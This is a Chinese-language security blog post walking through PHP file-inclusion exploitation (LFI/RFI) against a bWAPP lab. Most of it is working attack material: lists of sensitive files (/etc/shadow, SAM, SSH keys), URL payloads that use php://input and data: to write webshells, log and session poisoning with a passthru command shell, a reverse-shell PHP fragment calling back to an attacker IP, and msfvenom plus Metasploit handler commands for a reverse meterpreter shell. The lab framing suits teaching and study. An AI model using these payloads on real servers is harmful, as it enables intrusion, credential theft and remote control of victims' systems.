<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
    

    <!--Author-->
    
        <meta name="author" content="klion">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="php 包含利用小记 [ RFI / LFI ]"/>
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="klion&#39;s blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>php 包含利用小记 [ RFI / LFI ] - klion&#39;s blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    about me
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    blogs
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2016/06/26/php-inclusion-exploit/">
                php 包含利用小记 [ RFI / LFI ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-06-26</span>
            
            
            
                <span class="category">
                    <a href="/categories/inclusion/">inclusion</a>
                </span>
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <p>0x01 下面是常用的一些php包含函数,没列完,详细用法大家还是自己看手册吧,上面说的比较详细:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">inluce()</div><div class="line">inluce_once()</div><div class="line"><span class="keyword">require</span>()</div><div class="line">require_once()</div><div class="line">fopen() </div><div class="line">readfile()</div><div class="line">……</div></pre></td></tr></table></figure></p>
<p>0x02 php本地包含简单利用过程[LFI]:</p>
<p>1), 搜集各种目标服务器的各种敏感路径,后面可能会利用到这些,这里写的不全,有整理好的fuzzdb,大家可以参考那个:</p>
<p>win 各类敏感文件路径<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32<span class="symbol">\e</span>ula.txt</div><div class="line">c:<span class="symbol">\b</span>oot.ini  </div><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\w</span>in.ini  </div><div class="line">c:<span class="symbol">\W</span>INNT<span class="symbol">\w</span>in.ini  </div><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\R</span>epair<span class="symbol">\S</span>AM  </div><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\W</span>INNT<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache<span class="symbol">\c</span>onf<span class="symbol">\h</span>ttpd.conf  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache2<span class="symbol">\c</span>onf<span class="symbol">\h</span>ttpd.conf  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\x</span>ampp<span class="symbol">\a</span>pache<span class="symbol">\c</span>onf<span class="symbol">\h</span>ttpd.conf  </div><div class="line">c:<span class="symbol">\p</span>hp<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\p</span>hp5<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\p</span>hp4<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\a</span>pache<span class="symbol">\p</span>hp<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\x</span>ampp<span class="symbol">\a</span>pache<span class="symbol">\b</span>in<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\h</span>ome2<span class="symbol">\b</span>in<span class="symbol">\s</span>table<span class="symbol">\a</span>pache<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\h</span>ome<span class="symbol">\b</span>in<span class="symbol">\s</span>table<span class="symbol">\a</span>pache<span class="symbol">\p</span>hp.ini</div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache<span class="symbol">\l</span>ogs<span class="symbol">\a</span>ccess.log  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache<span class="symbol">\l</span>ogs<span class="symbol">\e</span>rror.log</div></pre></td></tr></table></figure></p>
<p>linux 各类敏感路径:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">/var/log/apache2/access.log</div><div class="line">/etc/httpd/logs/acces_log </div><div class="line">/etc/httpd/logs/error_log </div><div class="line">/var/www/logs/access_log </div><div class="line">/var/www/logs/access.log </div><div class="line">/usr/local/apache/logs/access_ log </div><div class="line">/usr/local/apache/logs/access. log </div><div class="line">/var/log/apache/access_log </div><div class="line">/var/log/apache2/access_log </div><div class="line">/var/log/apache/access.log </div><div class="line">/var/log/access_log</div><div class="line">../apache/logs/error.log</div><div class="line">../apache/logs/access.log</div><div class="line">../../apache/logs/error.log</div><div class="line">../../apache/logs/access.log</div><div class="line">../../../apache/logs/error.log</div><div class="line">../../../apache/logs/access.log</div><div class="line">../../../../../../../etc/httpd/logs/acces_log</div><div class="line">../../../../../../../etc/httpd/logs/acces.log</div><div class="line">../../../../../../../etc/httpd/logs/error_log</div><div class="line">../../../../../../../etc/httpd/logs/error.log</div><div class="line">../../../../../../../var/www/logs/access_log</div><div class="line">../../../../../../../var/www/logs/access.log</div><div class="line">../../../../../../../usr/local/apache/logs/access_ log</div><div class="line">../../../../../../../usr/local/apache/logs/access. log</div><div class="line">../../../../../../../var/log/apache/access_log</div><div class="line">../../../../../../../var/log/apache2/access_log</div><div class="line">../../../../../../../var/log/apache/access.log</div><div class="line">../../../../../../../var/log/apache2/access.log</div><div class="line">../../../../../../../var/log/access_log</div><div class="line">../../../../../../../var/log/access.log</div><div class="line">../../../../../../../var/www/logs/error_log</div><div class="line">../../../../../../../var/www/logs/error.log</div><div class="line">../../../../../../../usr/local/apache/logs/error_l og</div><div class="line">../../../../../../../usr/local/apache/logs/error.l og</div><div class="line">../../../../../../../var/log/apache/error_log</div><div class="line">../../../../../../../var/log/apache2/error_log</div><div class="line">../../../../../../../var/log/apache/error.log</div><div class="line">../../../../../../../var/log/apache2/error.log</div><div class="line">../../../../../../../var/log/error_log</div><div class="line">../../../../../../../var/log/error.log</div></pre></td></tr></table></figure></p>
<p>高权限的情况下,可以先顺便看看目标系统的各类系统配置文件,说不定在这里就已经有收获了,如下:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/proc/mounts</div><div class="line">/proc/net/arp</div><div class="line">/proc/net<span class="built_in">/route</span></div><div class="line">/proc/net/tcp</div><div class="line">/proc/net/udp</div><div class="line">/proc/net/fib_trie</div><div class="line">/proc/version</div><div class="line">/proc/self/environ</div><div class="line">c:\WINDOWS\TEMP\  </div><div class="line">c:\php\sessions\  </div><div class="line">c:\php5\sessions\  </div><div class="line">c:\php4\sessions\</div><div class="line">/etc/issue</div><div class="line">/etc/motd</div><div class="line">/etc/passwd </div><div class="line">/etc<span class="built_in">/group </span></div><div class="line">/etc/resolv.conf</div><div class="line">/etc/shadow</div><div class="line">.htaccess</div><div class="line">config.php</div><div class="line">authorized_keys</div><div class="line">id_rsa</div><div class="line">id_rsa.keystore</div><div class="line">id_rsa.pub</div><div class="line">known_hosts</div><div class="line">.bash_history</div><div class="line">.mysql_history</div><div class="line">.my.cnf</div></pre></td></tr></table></figure></p>
<p>2),选择要包含的对象:</p>
<p>普通权限下的包含:</p>
<p>利用php的各种伪协议[主要是控制文件流输出即<code>写文件</code>,可能你还要对你所要写的那个目录有写权限才行] ,利用条件[这些信息全部可以在phpinfo中看到]:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">小于5.0 即使<span class="attribute">allow_url_include</span>=Off 可用</div><div class="line">大于5.0 只有<span class="attribute">allow_url_fopen</span>=on才能用</div></pre></td></tr></table></figure></p>
<p><img src="/img/include phpinfo.png" alt=""><br><img src="/img/include phpinfo inluce.png" alt=""><br><img src="/img/include phpinfo gpc.png" alt=""></p>
<p>利用 php://input 写shell<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.3.10/bWAPP/rlfi.php?language=php://input&amp;action=go</div><div class="line">POST: &lt;?php fputs(fopen("HELPS.php","a"),'&lt;?php $sl = create_function("", @$_REQUEST["request"]);$sl();?&gt;') ?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="/img/include  input.png" alt=""><br><img src="/img/include  input res.png" alt=""></p>
<p>利用 data: 写shell<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php fputs(fopen(<span class="string">"HELPS.php"</span>,<span class="string">"a"</span>),<span class="string">'&lt;?php $sl = create_function("", @$_REQUEST["sec"]);$sl();?&gt;'</span>) ?&gt;  编码前的webshell</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">data:</span>text/plain,&lt;?php fputs(fopen(<span class="string">"infos.php"</span>,<span class="string">"a"</span>),<span class="string">'&lt;?php $sl = create_function("", @$_REQUEST["klionsec"]);$sl();?&gt;'</span>) ?&gt;&amp;action=go</div></pre></td></tr></table></figure></p>
<p><img src="/img/include data.png" alt=""><br><img src="/img/include data res.png" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">data:</span>text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oIkhFTFBTLnBocCIsImEiKSwnPD9waHAgJHNsID0gY3JlYXRlX2Z1bmN0aW9uKCIiLCBAJF9SRVFVRVNUWyJzZWMiXSk7JHNsKCk7Pz4nKSA/Pg==&amp;action=go</div></pre></td></tr></table></figure>
<p><img src="/img/include data base64.png" alt=""><br><img src="/img/include data base64 res.png" alt=""></p>
<p>利用 php://filter 读取目标敏感文件 [可以是相对,绝对和远程路径{ftp,http}]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">php:</span>/<span class="regexp">/filter/resource</span>=./admin/settings.php&amp;action=go  最好不要用这个,貌似不能写,读不出来</div></pre></td></tr></table></figure></p>
<p><img src="/img/include data filter base64.png" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">把读出来的内容base64解码一下,就可以看到明文内容了</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">php:</span>/<span class="regexp">/filter/convert</span>.base64-encode/resource=./admin/settings.php&amp;action=go</div></pre></td></tr></table></figure>
<p><img src="/img/include data filter base64 res.png" alt=""></p>
<p>利用 zip:// 传shell<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">zip:</span>/<span class="regexp">/./options</span>.zip%<span class="number">23</span>options&amp;action=go  这里的<span class="comment">#务必要转成url编码后的%23,自己本地测时候不太靠谱</span></div></pre></td></tr></table></figure></p>
<p>利用 phar:// 原理同上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">phar:</span>/<span class="regexp">/./ex</span>.phar%<span class="number">23</span>ex&amp;action=go 也不太好使</div></pre></td></tr></table></figure></p>
<p>利用 expect://ls  可直接执行系统命令,自己多次尝试并未成功,且默认该模块是没有启用的</p>
<p>尝试把一句话放到user-agent或者请求里面 [注意编码,用burp拦下改过来或者直接用nc就好了],然后想办法去包含目标的web访问日志文件<br>前提是你要找到这些日志文件的物理路径才行],另外,还有一点需要说明下,对于一些正常企业的web服务器来讲,他们的日志一般都是按日期切割保存的,即使被你侥幸猜到了访问日志的文件名,但单个日志文件也仍然是比较大的,显然,这时再去包含日志就很不明智了<br>说这个,并不是想说这种方法不管用,实际渗透你要按你自己目标的实际情况来,对了,顺便再补充一句,虽然,访问日志的文件很大,但你还可以包含错误日志呀<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc 192.168.3.10 80</span></div><div class="line">  GET /&lt;?php passthru($_GET[<span class="string">'cmd'</span>]); ?&gt; HTTP/<span class="number">1.1</span>  这里不一定非要用一句话,你还是尝试把它直接换成一个上传表单或者直接从远程下载webshell也是可以的</div><div class="line">  <span class="symbol">Host:</span> <span class="number">192.168</span>.<span class="number">3.10</span></div><div class="line">  <span class="symbol">Connection:</span> close</div><div class="line">  </div><div class="line">  <span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="regexp">/var/log</span><span class="regexp">/apache2/access</span>.log&amp;action=go&amp;cmd=w</div></pre></td></tr></table></figure></p>
<p><img src="/img/include log.png" alt=""><br><img src="/img/include log res.png" alt=""></p>
<p>跟包含日志差不你也可以把一句话放到user-agent中然后包含/proc/self/environ这个系统环境变量,用法同上,不再赘述</p>
<p>尝试包含服务端的session文件,想要包含session,你务必要先确定这个session的文件名,不出意外的情况下,这个session文件名应该是PHPSESSID加上’sess_’前缀,一般会被放到下面的这里目录中,另外,利用的时候动作务必要快,因为一个session 如果长时间没动作,很快就会被回收[php自身的垃圾回收机制]<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">可能存放session的一些目录:</div><div class="line"><span class="regexp">/var/lib</span><span class="regexp">/php5/</span></div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">php</span>/</span></div><div class="line">/tmp/</div><div class="line">……</div></pre></td></tr></table></figure></p>
<p>session 内容一般都是类似下面的这种形式,不过前提是你要能控制这段session才行:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">login|<span class="string">s:</span><span class="number">3</span>:<span class="string">"bee"</span>;admin|<span class="string">s:</span><span class="number">1</span>:<span class="string">"1"</span>;token|<span class="string">s:</span><span class="number">40</span>:<span class="string">"c0c7fa8b6d373ad173fe7d99019a183d3bd3d888"</span>;amount|<span class="string">i:</span><span class="number">1000</span>;</div><div class="line"><span class="string">http:</span><span class="comment">//192.168.3.10/bWAPP/rlfi.php?language=/var/lib/php5/sess_b449542fdbd76c4e860e6ea34a3c46a2&amp;action=go&amp;cmd=id</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/include session.png" alt=""></p>
<p>包含自己上传到目标机器的的其他文件 [如,图片马(不一定非要用真正的图片马,如果验证不是很严,随便一个shell改下后缀就好了),txt,附件……]<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">3.10</span><span class="regexp">/bWAPP/</span>rlfi.php?language=<span class="regexp">/var/</span>www<span class="regexp">/shell.jpg&amp;action=go&amp;cmd=id</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/include pic shell.png" alt=""></p>
<p>通过目标邮件来反弹shell [实际渗透中暂时还没尝试过,本地也未成功,后期搞清楚问题在哪里,再更新上来]<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> smtp-user-enum -M VRFY -U /home/weak_wordlist/userall.txt -t 192.168.3.10  先来枚举下目标系统有哪些用户</span></div><div class="line"><span class="meta">#</span><span class="bash"> telnet 192.168.3.10 25</span></div><div class="line">  HELO localhost</div><div class="line">  mail from:&lt;root&gt;</div><div class="line">  rcpt to:&lt;www-data&gt;</div><div class="line">  data</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">  set_time_limit(0);</div><div class="line"><span class="meta">  $</span><span class="bash">VERSION = <span class="string">"1.0"</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">ip = <span class="string">"192.168.3.9"</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">port = 80;</span></div><div class="line"><span class="meta">  $</span><span class="bash">chunk_size = 1400;</span></div><div class="line"><span class="meta">  $</span><span class="bash">write_a = null;</span></div><div class="line"><span class="meta">  $</span><span class="bash">error_a = null;</span></div><div class="line"><span class="meta">  $</span><span class="bash">shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">daemon = 0;</span></div><div class="line"><span class="meta">  $</span><span class="bash">debug = 0;</span></div></pre></td></tr></table></figure></p>
<p>配合phpinfo来包含,其实也是包含临时文件的一种方法,可惜没有成功,初步估计是脚本的问题,后期手工再试试,成功以后会把过程再更新上来</p>
<p>0x03 包含时经常会遇到的一些问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%<span class="number">00</span> ? 后面拼接有多余的后缀,可利用各种空字节来尝试截断,当然啦,转义开关肯能需要关上, php小于 <span class="number">5.3</span>.<span class="number">4</span>可行</div></pre></td></tr></table></figure></p>
<p>尝试超长路径截断,在正常的路径后面跟上超长字符,可用.小于5.2.8,如下:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/var/log/apache2/error.log.........................................................................................</div><div class="line">../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../var/log/apache2/error.log</div><div class="line">/var/log/apache2/error.log/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../</div></pre></td></tr></table></figure></p>
<p>有时候可能会有过滤路径分隔符的问题,可以尝试用%2F代替</p>
<p>如果后端是类似白名单的检查,就不太好过了,正在学习中……希望表哥们能多多提携</p>
<p>问题其实还有很多很多,正在学习中,待续……</p>
<p>0x04 php远程包含[RFI]:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">利用条件:</div><div class="line">allow_url_fopen=On</div><div class="line">allow_url_include=On</div></pre></td></tr></table></figure>
<p>简要利用过程[基本同上,同样,如果是那种白名单的检查,想过还是比较难的]:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>//<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.10</span>/bWAPP/rlfi.php?language=http://<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.9</span>/phpinfoupload.html&amp;action=go</div></pre></td></tr></table></figure></p>
<p><img src="/img/remote include.png" alt=""></p>
<p>0x05 最后,还有一个比较好用的利用方式,就是直接利用msf的php payload 弹回一个meterpreter的shell,有一个功能完备的shell这是我们所期望的:</p>
<p>先装个小工具,等会儿要用到<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> apt-get install xclip -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">alias</span> pbcopy=<span class="string">'xclip -selection clipboard'</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">alias</span> pbpaste=<span class="string">'xclip -selection clipboard -o'</span></span></div></pre></td></tr></table></figure></p>
<p>先用msf生成好php的payload,之后稍微处理下<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># msfvenom -<span class="keyword">p</span> php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">3.9</span> LPORT=<span class="number">53</span> -<span class="keyword">f</span> raw &gt; <span class="keyword">shell</span>.php</div><div class="line"># <span class="keyword">cat</span> <span class="keyword">shell</span>.php | pbcopy &amp;&amp; <span class="keyword">echo</span> <span class="string">'&lt;?php '</span> | <span class="keyword">tr</span> -d <span class="string">'\n'</span> &gt; <span class="keyword">shell</span>.php &amp;&amp; pbpaste &gt;&gt; <span class="keyword">shell</span>.php</div></pre></td></tr></table></figure></p>
<p><img src="/img/include meterpreter.png" alt=""></p>
<p>本地监听准备先准备好<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfconsole</span></div><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> payload php/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> lhost 192.168.3.9</div><div class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> lport 53</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure></p>
<p>这时尝试包含我们msf的php shell,访问之后,shell顺利弹回,注意,这期间浏览器会一直处于阻塞状态,直到会话断开,粗略的看了一眼代码,应该是在用php循环的发socket,这个shell应该比菜刀的一句话强多了吧</p>
<p><img src="/img/include meterpreter meterpreter.png" alt=""><br><img src="/img/include meterpreter access.png" alt=""></p>
<p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;以后文章中的所有漏洞利用过程,尽量会全部在本地搭环境重现[其实,实际渗透跟这个也差不太远,主要是可能会出各种各样的问题,仅仅就差那个解决问题的过程没掌握到而已],公开的东西,用实例始终是不太好的,大家谅解哈,关于php包含实际渗透中能用到的,我自己所知道的可能就这些了,希望表哥们能把自己压箱底的家伙都共享出来,小弟好多多学习……<br><br></p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/inclusion/">#inclusion</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>

</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">

<center>
<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
<br>
<br>
<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
<br>
<br>
<img src="/img/small.jpg"  alt="klionsec" />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
<br><br>
<br><font color="yellow" size="4">
如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
</font><br><br>
<font color="#00FF7F" size="4">
相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
<span id="busuanzi_container_site_uv">
累计访客数 <span id="busuanzi_value_site_uv"></span> 
</span>
<span id="showDays"></span>
<script>
var birthDay = new Date("12/28/2014");
var now = new Date();
var duration = now.getTime() - birthDay.getTime(); 
var total= Math.floor(duration / (1000 * 60 * 60 * 24));
document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
</script>
<br>
<br>
